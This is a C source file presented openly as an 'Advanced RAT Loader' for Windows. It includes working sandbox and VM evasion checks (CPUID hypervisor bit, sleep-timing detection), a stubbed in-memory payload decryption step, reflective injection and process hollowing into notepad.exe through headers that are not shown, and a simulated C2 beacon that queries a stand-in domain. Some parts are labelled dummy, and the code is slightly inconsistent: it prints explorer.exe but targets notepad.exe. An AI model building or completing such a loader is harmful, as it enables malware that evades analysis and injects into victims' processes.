#include <windows.h>
#include <stdio.h>
#include "reflective_loader.h"
#include "process_hollowing.h"

// Advanced Sandbox & VM Detection
int detect_vm() {
    int cpuInfo[4] = { 0 };
    __cpuid(cpuInfo, 1);

    // Check Hypervisor Present bit (bit 31 of ECX after CPUID with eax=1)
    if ((cpuInfo[2] >> 31) & 1) {
        printf("[!] Hypervisor detected. Exiting.\n");
        return 1;
    }

    // Timing detection (sleep skip detection)
    DWORD start = GetTickCount();
    Sleep(3000);
    DWORD elapsed = GetTickCount() - start;
    if (elapsed < 2900) {
        printf("[!] Timing anomaly detected (sandbox).\n");
        return 1;
    }

    return 0;
}

// AES-decrypt payload in memory (dummy stub - encryption step comes later)
LPVOID decrypt_payload(LPVOID encrypted_payload, DWORD payload_size) {
    printf("[+] Simulating in-memory decryption of payload.\n");
    return encrypted_payload; // Replace with real decryption routine
}

// Simulated basic DNS "beacon" - C2 placeholder
void c2_communication() {
    printf("[*] Pinging fake C2 server (simulated)...\n");
    system("nslookup my-fake-c2-domain.com > nul");
    printf("[+] C2 communication simulation completed.\n");
}

int main() {
    printf("\n===== Advanced RAT Loader (Reflective Injection + Process Hollowing) =====\n");

    // Step 1: Anti-VM and Anti-Sandbox Checks
    if (detect_vm()) {
        printf("[!] Environment flagged as sandbox/VM. Exiting.\n");
        return 1;
    } else {
        printf("[+] No sandbox detected. Proceeding...\n");
    }

    // Step 2: Load Encrypted Payload from File
    DWORD encrypted_size = 0;
    LPVOID encrypted_payload = load_payload("payload\\dummy_payload.dll", &encrypted_size);
    if (!encrypted_payload) {
        printf("[!] Payload load failed.\n");
        return 1;
    }
    printf("[+] Encrypted payload loaded (%ld bytes).\n", encrypted_size);

    // Step 3: Decrypt Payload in Memory
    LPVOID decrypted_payload = decrypt_payload(encrypted_payload, encrypted_size);
    if (!decrypted_payload) {
        printf("[!] Decryption failed.\n");
        HeapFree(GetProcessHeap(), 0, encrypted_payload);
        return 1;
    }

    // Step 4: Reflective Injection (fileless execution)
    printf("[*] Executing Reflective Loader...\n");
    if (!reflective_load(decrypted_payload)) {
        printf("[!] Reflective injection failed.\n");
        HeapFree(GetProcessHeap(), 0, encrypted_payload);
        return 1;
    }
    printf("[+] Reflective Injection completed successfully.\n");

    // Step 5: Process Hollowing to notepad.exe
    printf("[*] Hollowing into explorer.exe...\n");
    if (!hollow_process("C:\\Windows\\System32\\notepad.exe", decrypted_payload, encrypted_size)) {
        printf("[!] Hollowing failed.\n");
        HeapFree(GetProcessHeap(), 0, encrypted_payload);
        return 1;
    }
    printf("[+] Process hollowing succeeded.\n");

    // Step 6: Simulate basic C2 Communication
    c2_communication();

    // Cleanup
    HeapFree(GetProcessHeap(), 0, encrypted_payload);
    printf("[+] Payload memory cleared, execution finished.\n");

    return 0;
}
